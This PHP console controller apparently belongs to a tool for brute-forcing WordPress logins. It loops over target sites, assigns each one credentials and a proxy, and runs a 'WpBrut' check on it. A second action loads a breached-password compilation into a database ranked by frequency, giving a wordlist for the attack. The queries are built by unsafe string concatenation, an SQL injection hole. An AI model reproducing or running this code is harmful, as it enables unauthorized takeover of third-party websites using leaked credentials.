<?php
namespace console\controllers;

use yii\console\Controller;
use app\models\SiteRepository;
use app\models\ProxyRepository;
use console\components\wp\WpBrut;

class WpController extends Controller
{
    public function init()
    {
        parent::init(); // TODO: Change the autogenerated stub
        //register shutdown
    }

    /**
     * @return Wordpress
     */
    public function blog()
    {
        return \Yii::$app->blog;
    }

    public function actionIndex(){
        $siteRepository = new SiteRepository();
        $proxyRepository = new ProxyRepository();

        $wpBrut = new WpBrut();
        while ( $site = $siteRepository->getAvailableSite() ){
            if(!$siteRepository->setAccessesAttributes($site)){
                $site->uncompleated();
                continue;
            }

            if(!$proxyRepository->setProxyAttributes($site)){
                $site->uncompleated();
                continue;
            }
            try{
                if($wpBrut->check($site)){
                    $site->compleated();
                    continue;
                }

                $site->available();
            } catch (\Exception $e){
                echo $e->getMessage() . PHP_EOL;
                echo ' Exception Connect' . PHP_EOL;
                $site->revert();
            }



        }
    }

    public function actionLoadPass(){
        $filePath = '/home/vlad/work_data/passwords/breachcompilation.txt';
        $descriptor = fopen($filePath, 'r');
        $c= 0;
        \Yii::$app->db->createCommand('update password set weight=0')->execute();

        while (($string = fgets($descriptor)) !== false) {
            $string = trim($string);
            $affected = \Yii::$app->db->createCommand('update password set weight=weight+1 where password="' . $string .'"')->execute();
            if(!$affected){
                \Yii::$app->db->createCommand('insert into password(password, weight) values("' . $string . '", 1)')->execute();
            }
            $c++;
            if(!($c%400)) {
                echo $c . ': ' . $string . PHP_EOL;
               // sleep(1);
            }
        }
        fclose($descriptor);
    }
}